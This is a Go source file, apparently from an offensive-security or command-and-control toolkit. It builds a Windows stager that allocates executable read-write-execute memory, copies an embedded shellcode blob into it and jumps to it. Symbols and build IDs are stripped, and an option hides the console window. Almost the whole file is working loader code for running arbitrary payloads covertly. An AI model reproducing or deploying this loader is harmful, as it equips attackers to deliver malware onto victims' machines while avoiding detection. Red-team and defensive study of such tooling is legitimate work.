package palace

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// stagerSource is a minimal Windows EXE that maps the embedded blob
// and calls its entry point. The mapping is RWX on purpose: the blob
// mixes code with writable globals (.bss API pointers), so RX would
// fault on the first resolve_all store. The blob's own payload and
// PICO allocations still honor no-RWX internally.
const stagerSource = `package main

import (
	_ "embed"
	"os"
	"syscall"
	"unsafe"
)

//go:embed blob.bin
var blob []byte

func main() {
	if len(blob) == 0 {
		os.Exit(1)
	}
	k32 := syscall.NewLazyDLL("kernel32.dll")
	valloc := k32.NewProc("VirtualAlloc")
	move := k32.NewProc("RtlMoveMemory")
	addr, _, _ := valloc.Call(0, uintptr(len(blob)), 0x3000, 0x40)
	if addr == 0 {
		os.Exit(1)
	}
	_, _, _ = move.Call(addr, uintptr(unsafe.Pointer(&blob[0])), uintptr(len(blob)))
	_, _, _ = syscall.Syscall(addr, 0, 0, 0, 0)
}
`

// BuildStager writes blob plus the stager source into dir, cross
// compiles a Windows AMD64 EXE, and returns its path. console keeps
// the console window; otherwise the stager builds windowless.
func BuildStager(dir string, blob []byte, console bool) (string, error) {
	if len(blob) == 0 {
		return "", fmt.Errorf("stager needs a non-empty blob")
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(dir, "blob.bin"), blob, 0o644); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(dir, "stager.go"), []byte(stagerSource), 0o644); err != nil {
		return "", err
	}
	if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module stager\n\ngo 1.23\n"), 0o644); err != nil {
		return "", err
	}
	ldflags := "-s -w -buildid="
	if !console {
		ldflags = "-s -w -H=windowsgui -buildid="
	}
	exe := filepath.Join(dir, "stager.exe")
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", exe, "stager.go")
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0", "GOPROXY=off")
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("stager build: %w\n%s", err, strings.TrimSpace(string(out)))
	}
	return exe, nil
}
